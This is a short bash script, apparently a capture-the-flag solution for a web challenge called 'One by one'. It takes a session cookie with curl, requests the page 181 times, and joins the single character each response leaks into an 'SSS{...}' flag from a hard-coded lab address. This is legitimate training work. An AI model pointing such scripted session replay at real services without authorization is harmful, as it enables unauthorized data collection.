#!/bin/bash
PORT=8090

if [[ $1 == "local" ]]
then
    url='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
then
    url='http://141.85.224.118:'$PORT
else
    url=$1':'$2
fi

# One by one
echo "Start exploit for One by one"
url=$url'/one-by-one/'
curl -s -c cookies.txt -o /dev/null $url
phpsessid=$(cat cookies.txt | grep PHPSESSID | awk '{print $7}')
flag=''
for i in {1..181}
do 
    aux=$(curl -s -b 'PHPSESSID='$phpsessid'' $url | grep -o ">.<" | grep -o "[^><]")
    flag=$flag$aux
done
flag=$(echo $flag | grep -m 1 -o "SSS{.*}")
echo "Flag is $flag"
echo "----------------------------"
